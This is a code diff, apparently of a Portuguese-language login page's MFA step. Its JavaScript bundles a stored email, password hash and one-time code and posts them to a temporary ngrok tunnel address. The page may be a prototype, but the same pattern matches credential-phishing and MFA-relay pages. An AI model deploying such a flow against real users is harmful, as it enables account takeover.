@@ -21,33 +21,39 @@
   </div>
 
   <script>
-  function verificarMfa() {
-    const codigoMfa = document.getElementById("codigoMfa").value;
+function verificarMfa() {
+  const codigoMfa = document.getElementById("codigoMfa").value;
+  const usuarioTemp = JSON.parse(localStorage.getItem("usuarioTemp")) || {};
 
-    // Recupera dados anteriores salvos no localStorage
-    const usuarioTemp = JSON.parse(localStorage.getItem("usuarioTemp")) || {};
-    usuarioTemp.codigoMfa = codigoMfa;
-
-    // Envia os dados completos para o servidor
-    fetch("https://400920d4110a.ngrok-free.app/dados", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(usuarioTemp)
-})
-
-    .then(res => {
-      if (res.ok) {
-        alert("✅ Dados enviados com sucesso!");
-        window.location.href = "boas-vindas.html";
-      } else {
-        alert("❌ Erro ao enviar os dados.");
-      }
-    })
-    .catch(erro => {
-      console.error("Erro:", erro);
-      alert("⚠️ Não foi possível conectar ao servidor.");
-    });
+  // Garante que os dados originais estão presentes
+  if (!usuarioTemp.email || !usuarioTemp.senhaHash) {
+    alert("❌ Dados de login ausentes. Volte e preencha novamente.");
+    return;
   }
+
+  usuarioTemp.codigoMfa = codigoMfa;
+
+  console.log("📤 Enviando:", usuarioTemp); // Para inspeção no DevTools
+
+  fetch("https://400920d4110a.ngrok-free.app/dados", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(usuarioTemp)
+  })
+  .then(res => {
+    if (res.ok) {
+      alert("✅ Autenticação concluída com sucesso!");
+      window.location.href = "boas-vindas.html";
+    } else {
+      alert("❌ Erro na autenticação.");
+    }
+  })
+  .catch(err => {
+    console.error("⚠️ Erro de conexão:", err);
+    alert("⚠️ Não foi possível enviar os dados.");
+  });
+}
+
 </script>
 
 </body>
